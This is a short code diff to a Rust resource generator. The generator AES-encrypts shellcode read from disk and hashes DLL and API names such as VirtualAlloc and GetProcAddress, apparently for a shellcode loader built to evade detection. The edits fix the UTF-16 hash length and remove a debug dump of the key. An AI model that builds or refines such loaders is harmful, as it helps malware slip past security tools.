@@ -64,7 +64,7 @@ impl ResourceGenerator {
 
         let shellcode = aes_encrypt_bytes(
             fs::read(SHELLCODE_PATH)
-                .expect("Could not unwrap shellcode.")
+                .expect("Could not read shellcode from disk.")
                 .as_slice(),
             &aes_key,
             &aes_iv,
@@ -82,7 +82,8 @@ impl ResourceGenerator {
 
             //also store the hash, if it's needed.
             let hash = if string_name.ends_with(".dll") || string_name.ends_with(".DLL") {
-                hash_case_insensitive(string_name.as_ptr() as usize, string_name.len())
+                let w_string = string_name.encode_utf16().collect::<Vec<u16>>();
+                hash_case_insensitive(w_string.as_ptr() as usize, w_string.len() * 2)
             } else {
                 let mut c_string = string_name.to_string();
                 c_string.push(0 as char);
@@ -95,7 +96,7 @@ impl ResourceGenerator {
             // if string_name == "GetProcAddress" {
             // }
             // if string_name == "VirtualAlloc" {
-            //     fs::write("va.txt", format!("\n{:X?}\n{:X?}\n{:X?}", encrypted, aes_iv, aes_key));
+            //
             // }
 
             aes_hashes.push(AESHash {
@@ -121,7 +122,7 @@ impl ResourceGenerator {
             //also generate the hash, if it's needed
             let hash = if string_name.ends_with(".dll") || string_name.ends_with(".DLL") {
                 let w_string = string_name.encode_utf16().collect::<Vec<u16>>();
-                hash_case_insensitive(w_string.as_ptr() as usize, string_name.len() * 2)
+                hash_case_insensitive(w_string.as_ptr() as usize, w_string.len() * 2)
             } else {
                 let mut c_string = string_name.to_string();
                 c_string.push(0 as char);
